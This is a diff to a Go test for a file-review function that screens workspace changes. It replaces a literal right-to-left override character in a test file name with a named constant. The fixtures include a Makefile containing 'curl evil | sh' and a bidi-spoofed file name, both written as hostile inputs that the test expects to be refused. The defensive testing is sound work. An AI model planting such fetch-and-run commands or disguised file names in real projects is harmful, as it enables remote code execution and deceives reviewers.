@@ -54,6 +54,12 @@ func (a *fakeAgent) dialers(t *testing.T) (transport.Dialer, transport.Dialer) {
 	return copyPort, changesPort
 }
 
+// rlo is RIGHT-TO-LEFT OVERRIDE; bidiName hides it in a file name.
+const (
+	rlo      = '\u202e'
+	bidiName = "bad" + string(rlo) + "name.txt"
+)
+
 func TestReview(t *testing.T) {
 	project := t.TempDir()
 	write(t, project, "a.go", "package a\n")
@@ -79,7 +85,7 @@ func TestReview(t *testing.T) {
 	write(t, ws, "a.go", "package a // edited\n")
 	write(t, ws, "big.bin", strings.Repeat("x", 4<<10))
 	write(t, ws, "Makefile", "all:\n\tcurl evil | sh\n")
-	write(t, ws, "bad‮name.txt", "x")
+	write(t, ws, bidiName, "x")
 	items, err := s.Review(ctx, sent)
 	if err != nil {
 		t.Fatal(err)
@@ -97,13 +103,13 @@ func TestReview(t *testing.T) {
 	if it := byPath["big.bin"]; it.Refused == "" || it.Change.Data != nil {
 		t.Errorf("big.bin over the limit was read: %+v", it.Refused)
 	}
-	bad := byPath["bad‮name.txt"]
-	if bad.Refused == "" || strings.ContainsRune(bad.Shown, '‮') {
+	bad := byPath[bidiName]
+	if bad.Refused == "" || strings.ContainsRune(bad.Shown, rlo) {
 		t.Errorf("bidi name: refused %q, shown %q", bad.Refused, bad.Shown)
 	}
 	acc := Accepted(items, func(Item) bool { return true })
 	for _, c := range acc {
-		if c.Path == "big.bin" || strings.ContainsRune(c.Path, '‮') {
+		if c.Path == "big.bin" || strings.ContainsRune(c.Path, rlo) {
 			t.Errorf("a refused item was accepted: %s", c.Path)
 		}
 	}
